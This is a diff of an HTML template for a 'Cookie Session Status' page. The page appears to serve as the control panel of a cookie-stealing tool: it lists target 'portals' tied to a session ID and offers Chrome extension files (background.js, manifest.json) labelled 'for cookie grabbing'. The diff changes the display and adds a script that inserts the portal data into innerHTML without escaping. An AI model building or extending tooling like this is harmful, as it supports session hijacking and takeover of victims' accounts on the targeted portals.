@@ -57,24 +57,23 @@
 <body>
     <div class="container">
         <h1>🍪 Cookie Session Status</h1>
-        <div class="session-id">Session ID: {{SESSION_ID}}</div>
+        <div class="session-id">Session ID: {{SESSION_ID}}</div>        
         
+        <div class="portals-list" style="margin-top: 15px;">
+            <h3>🌐 Portal List:</h3>
+            <div style="background-color: #f8f9fa; padding: 10px; border-radius: 4px; font-family: monospace;">
+                <div id="portals-display"></div>
+            </div>
+        </div>
+
         <!-- Data for plugin to extract from DOM -->
         <div id="plugin-data" style="display: none;">
             <div id="session-id">{{SESSION_ID}}</div>
             <div id="portals">{{PORTALS}}</div>
         </div>
-        
-        <div class="plugin-status-section">
-            <h2>🔌 Plugin Status</h2>
-            <div id="plugin-status-indicator" class="status-indicator">
-                <span id="status-text">Checking plugin status...</span>
-                <div class="status-dot" id="status-dot"></div>
-            </div>
-        </div>
-        
+                
         <div class="download-section">
-            <h2>� Plugin Status</h2>
+            <h2>Plugin Status</h2>
             <div class="status-cookies-plugin" style="
                 display: inline-block;
                 padding: 8px 16px;
@@ -87,16 +86,16 @@
         </div>
 
         <div class="download-section">
-            <h2>�📁 Chrome Extension Files</h2>
+            <h2>Chrome Extension Files</h2>
             <p>Download the Chrome extension files for cookie grabbing:</p>
             
             <a href="/download/background.js?sessionId={{SESSION_ID}}" class="download-btn" download="background.js">
-                📄 Download background.js
+                Download background.js
             </a>
             <div class="file-info">Main extension background script</div>
             
             <a href="/download/manifest.json?sessionId={{SESSION_ID}}" class="download-btn" download="manifest.json">
-                📋 Download manifest.json
+                Download manifest.json
             </a>
             <div class="file-info">Chrome extension manifest file</div>
             
@@ -106,5 +105,24 @@
             </div>
         </div>
     </div>
+
+    <script>
+        // Format portals display on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            const portalsDisplay = document.getElementById('portals-display');
+            const portalsData = document.getElementById('portals');
+            
+            if (portalsDisplay && portalsData) {
+                try {
+                    const portals = JSON.parse(portalsData.textContent);
+                    portalsDisplay.innerHTML = portals.map((portal, index) => 
+                        `${index + 1}. ${portal}`
+                    ).join('<br>');
+                } catch (e) {
+                    portalsDisplay.textContent = 'Error parsing portals data';
+                }
+            }
+        });
+    </script>
 </body>
 </html>
